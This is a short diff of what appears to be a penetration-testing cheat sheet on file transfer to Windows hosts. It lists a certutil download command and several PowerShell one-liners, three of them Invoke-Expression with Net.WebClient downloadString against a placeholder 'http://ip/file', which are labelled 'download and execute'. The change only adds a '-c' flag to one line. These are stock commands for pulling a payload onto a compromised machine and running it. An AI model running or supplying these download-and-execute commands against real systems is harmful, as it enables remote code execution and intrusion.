@@ -3,5 +3,5 @@ certutil -urlcache -split -f "http://url/file" file
 
 POWERSHELL
 powershell -c "Invoke-WebRequest -Uri 'http://ip/file' -OutFile 'path'" # just download
-powershell "IEX(New-Object Net.WebClient).downloadString('http://ip/file')" # download and execute
+powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ip/file')" # download and execute
 echo IEX(New-Object Net.WebClient).DownloadString('http://ip/file') | powershell -noprofile # download and execute
